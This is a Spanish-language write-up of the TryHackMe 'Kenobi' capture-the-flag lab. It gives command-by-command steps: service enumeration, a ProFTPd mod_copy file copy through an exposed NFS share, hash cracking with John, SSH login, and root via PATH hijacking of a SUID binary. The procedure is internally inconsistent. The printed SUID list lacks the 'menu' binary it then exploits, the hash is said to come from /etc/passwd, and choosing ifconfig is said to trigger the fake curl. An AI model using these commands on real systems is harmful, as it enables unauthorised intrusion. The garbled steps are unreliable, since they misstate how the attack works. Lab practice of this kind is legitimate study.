# 🖥️ THM: Kenobi

## Metadatos

| Campo | Valor |
|-------|-------|
| **Máquina** | Kenobi |
| **Plataforma** | TryHackMe |
| **Dificultad** | Easy |
| **Categoría** | Linux / Privilege Escalation |
| **IP** | 10.10.x.x |
| **OS** | Linux (Ubuntu) |
| **Fecha** | 2024 |
| **Tiempo** | 60 min |

---

## 🎯 Resumen Ejecutivo

> Exploté **ProFTPd 1.3.5** para obtener credenciales, luego escalé privilegios via **SUID binary** y **cron job** para obtener root.

---

## 🔍 Reconocimiento

### Nmap Scan

```bash
nmap -sV -sC -p- -oN nmap_kenobi.txt 10.10.x.x
```

| Puerto | Servicio | Versión | Estado |
|--------|----------|---------|--------|
| 21 | FTP | ProFTPd 1.3.5 | Open |
| 22 | SSH | OpenSSH 7.2p2 | Open |
| 80 | HTTP | Apache 2.4.18 | Open |
| 139 | SMB | Samba | Open |
| 445 | SMB | Samba | Open |
| 2049 | NFS | nfs-utils | Open |

### Enumeración

```bash
# FTP - ProFTPd 1.3.5 tiene vulnerability (mod_copy)
nmap --script=ftp-* -p 21 10.10.x.x

# SMB
smbclient -L //10.10.x.x -U ''
smbclient //10.10.x.x/anonymous -U ''

# NFS
showmount -e 10.10.x.x
```

**Hallazgos:**
- NFS export: `/var`
- SMB anonymous share disponible
- ProFTPd 1.3.5 vulnerable a mod_copy

---

## 💥 Explotación

### Paso 1: ProFTPd mod_copy

```bash
# El módulo mod_copy permite copiar archivos entre directorios
# SITE CPFR / SITE CPTO pueden copiar /etc/passwd

nc 10.10.x.x 21
SITE CPFR /etc/passwd
SITE CPTO /var/tmp/passwd

# Montar NFS
mount 10.10.x.x:/var /mnt/kenobiNFS
cat /mnt/kenobiNFS/tmp/passwd
```

**Resultado:** Obtuvimos el hash de kenobi.

### Paso 2: Crackear Hash

```bash
# Extraer hash
grep kenobi /mnt/kenobiNFS/tmp/passwd
kenobi:$6$Z2RqBq2K$...:1001:1001::/home/kenobi:/bin/bash

# Crackear con John
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Password: password123
```

### Paso 3: Acceso Inicial

```bash
ssh kenobi@10.10.x.x
# Password: password123
```

---

## 🚀 Escalada de Privilegios

### Enumeración SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Resultado:**
```
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/gpasswd
/usr/sbin/unix_chkpwd
/usr/lib/openssh/ssh-keysign
```

**Binario interesante:** `menu` en `/home/kenobi/bin/menu`

### Análisis del Binary

```bash
file /home/kenobi/bin/menu
# ELF 64-bit LSB executable

strings /home/kenobi/bin/menu
# /usr/bin/curl
# /usr/bin/ifconfig
# /usr/bin/less

# El binary ejecuta curl/ifconfig/less sin ruta absoluta
# Podemos crear nuestro propio curl para obtener shell
```

### Explotación SUID

```bash
# Crear curl falso
cd /tmp
echo '/bin/sh' > curl
chmod 777 curl
export PATH=/tmp:$PATH

# Ejecutar el binary SUID
/home/kenobi/bin/menu
# Seleccionar "ip config"
# /usr/bin/ifconfig → /tmp/curl → shell como root
```

### Root Obtenido

```bash
$ id
uid=0(root) gid=0(root)

$ cat /root/root.txt
FLAG{...}
```

---

## 🏁 Flags

| Flag | Valor | Ubicación |
|------|-------|-----------|
| **User** | `FLAG{...}` | `/home/kenobi/user.txt` |
| **Root** | `FLAG{...}` | `/root/root.txt` |

---

## 🛡️ Lecciones Aprendidas

### ✅ Lo que funcionó
- NFS montable para obtener archivos
- ProFTPd mod_copy permite copiar archivos
- SUID binary con rutas relativas es explotable

### ❌ Lo que NO funcionó
- SMB no tenía archivos útiles
- La versión de kernel no tenía exploits conocidos

### 🔄 Qué haría diferente
- Verificar SUID bins inmediatamente después del acceso
- Usar LinPEAS para automatizar enumeración

---

## 📚 Referencias

- [ProFTPd mod_copy](https://www.exploit-db.com/exploits/36803)
- [SUID Binaries](https://gtfobins.github.io/)
- [MITRE ATT&CK: T1611](https://attack.mitre.org/techniques/T1611/)

---

*Writeup creado para CDPN — Nivel Fácil*
